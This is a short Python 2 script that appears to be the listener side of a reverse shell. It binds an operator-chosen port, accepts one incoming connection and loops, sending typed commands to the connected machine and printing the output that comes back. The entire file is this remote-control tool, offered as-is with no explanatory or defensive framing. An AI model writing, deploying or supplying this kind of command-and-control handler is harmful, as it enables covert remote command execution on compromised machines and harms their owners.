import os
import sys
import socket

def socketCreate():
    try:
        global host
        global port
        global s

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = ''
        port = raw_input('port ')
        if port == '':
            socketCreate()
        port = int(port)

    except:
        print('eror')

def socketBind():
    try:
        print 'binding... '
        s.bind((host,port))
        s.listen(1)
    except:
        print('binding error')
        print 'trying'
        socketBind()

def socketAccept():
    global conn
    global addr
    global hostname

    try:
        conn, addr = s.accept()
        print 'session open'
        print '\n'
        
    except:
        print 'accepting error'

def menu():
    while True:
        cmd = raw_input(str(addr[0]) + '@'+ '> ')
        if cmd == 'quit':
            conn.close()
            sys.exit()

        command = conn.send(cmd)
        result = conn.recv(16834)
        print(result)


def main():
    socketCreate()
    socketBind()
    socketAccept()
    menu()

main()





